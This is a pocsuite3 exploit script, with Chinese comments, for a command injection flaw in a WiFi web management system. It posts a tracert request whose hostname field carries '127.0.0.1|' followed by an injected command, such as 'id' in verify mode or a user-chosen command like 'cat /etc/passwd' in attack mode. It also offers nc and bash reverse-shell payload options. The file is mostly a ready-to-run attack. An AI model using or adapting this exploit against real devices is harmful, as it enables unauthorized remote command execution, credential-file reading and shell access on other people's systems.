from collections import OrderedDict
from urllib.parse import urljoin
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY

proxies={
    'http':'127.0.0.1:8080',
    'https':'127.0.0.1:8080'
}
class AIPOC(POCBase):
    vulID = '0'# ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'#默认为1
    author = ['luckying']#  PoC作者的大名
    vulDate = '2021-08-02' #漏洞公开的时间,不知道就写今天
    createDate = '2021-08-02'# 编写 PoC 的日期
    updateDate = '2021-08-02'# PoC 更新的时间,默认和编写时间一样
    references = ['']# 漏洞地址来源,0day不用写
    name = '西迪特 WiFi Web管理系统命令执行'# PoC 名称
    appPowerLink = ''# 漏洞厂商主页地址
    appName = '西迪特 WiFi Web管理系统'# 漏洞应用名称
    appVersion = 'ALL'# 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION #漏洞类型,类型参考见 漏洞类型规范表
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    利用:pocsuite -r .\poc++.py -u url(-f url.txt) --attack --command "cat /etc/passwd"
    '''# 漏洞简要描述
    samples = ['']# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = ''' poc的用法描述 '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):
        result = {}
        path = "/cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1"
        url = self.url + path
        #print(url)
        payload = "call_function=tracert&iface=eth0&hostname=127.0.0.1|id"
        #print(payload)
        headers={
           'Content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            resq = requests.post(url=url,data=payload,headers=headers,proxies=proxies)
            if resq and resq.status_code == 200 and "uid=" in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['POST'] = payload
        except Exception as e:
            return 
        return self.parse_output(result)

    def trim(str):
        newstr = ''
        for ch in str:          #遍历每一个字符串
            if ch!=' ':
                newstr = newstr+ch
        return newstr

    def _attack(self):
        result = {}
        path = "/cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1"
        url = self.url + path
        #print(url)
        cmd = self.get_option("command")
        payload = "call_function=tracert&iface=eth0&hostname=127.0.0.1|"+cmd+""
        #print(payload)
        headers={
           'Content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            resq = requests.post(url=url,data=payload,headers=headers)
            t = resq.text 
            t = t.replace('\n', '').replace('\r', '')
            print('output >>> ' + t)
            t = t.replace(" ","")
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Name'] = t
        except Exception as e:
            return
        


    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(AIPOC)